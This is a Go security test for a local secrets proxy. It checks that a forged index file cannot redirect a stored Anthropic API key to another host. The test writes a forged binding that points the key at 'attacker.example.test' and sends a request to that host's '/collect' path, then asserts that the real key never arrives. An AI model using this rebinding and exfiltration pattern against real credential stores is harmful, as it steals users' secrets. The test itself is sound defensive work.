package egress

import (
	"net/http"
	"os"
	"path/filepath"
	"sync/atomic"
	"testing"
	"time"

	"github.com/shadowhusky/localdot/keyd/internal/llm"
	"github.com/shadowhusky/localdot/keyd/internal/vault"
)

// A same-user process cannot read the Keychain, but it can write an index of its own and start
// the signed keyd over it. The stored value must not follow the binding that index names.
func TestAnIndexKeydDidNotWriteCannotSendAStoredSecretElsewhere(t *testing.T) {
	w := newWorld(t)
	dir := t.TempDir()
	store := vault.NewMemory()
	legit, err := vault.Open(store, filepath.Join(dir, "legit.json"))
	if err != nil {
		t.Fatal(err)
	}
	if err := legit.Put(vault.Record{ID: "anthropic", Kind: vault.KindLLM, Provider: "anthropic"}, []byte(realValue)); err != nil {
		t.Fatal(err)
	}
	forgedIndex := filepath.Join(dir, "forged.json")
	forged := `{"v":1,"secrets":[{"id":"anthropic","kind":"http","hosts":["attacker.example.test"],"header":"X-Api-Key","format":"raw","createdAt":"2026-10-08T00:00:00Z","updatedAt":"2026-10-08T00:00:00Z"}]}`
	if err := os.WriteFile(forgedIndex, []byte(forged), 0o600); err != nil {
		t.Fatal(err)
	}
	v, err := vault.Open(store, forgedIndex)
	if err != nil {
		t.Fatal(err)
	}
	var leaked atomic.Bool
	w.tlsUpstream("attacker.example.test", http.HandlerFunc(func(_ http.ResponseWriter, r *http.Request) {
		if r.Header.Get("X-Api-Key") == realValue {
			leaked.Store(true)
		}
	}))
	settings, _ := llm.OpenSettings(filepath.Join(dir, "settings.json"))
	budget, _ := llm.OpenBudget(filepath.Join(dir, "spend.json"), settings.Limits, time.Now)
	deps := w.deps()
	deps.Vault, deps.Budget, deps.Settings = v, budget, settings
	m := NewManager(ManagerDeps{Deps: deps, Ports: PortRange{}, CellsDir: filepath.Join(dir, "cells")})
	t.Cleanup(m.CloseAll)
	o, err := m.Open(OpenRequest{CellID: "forged", Role: "desktop", Secrets: []string{"anthropic"}})
	if err != nil {
		t.Fatal(err)
	}
	req, _ := http.NewRequest("GET", "https://attacker.example.test/collect", nil)
	req.Header.Set("X-Api-Key", o.Surrogates["anthropic"])
	resp, err := cellClient(w, o).Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if leaked.Load() {
		t.Fatal("the stored value reached the host a forged index bound it to")
	}
	if resp.StatusCode != http.StatusBadGateway || resp.Header.Get("X-Keyd-Secret") != "anthropic" {
		t.Fatalf("status %d naming %q, want 502 naming the key to enter again", resp.StatusCode, resp.Header.Get("X-Keyd-Secret"))
	}
	w.waitLine(reasonIs(ReasonRebound))
}
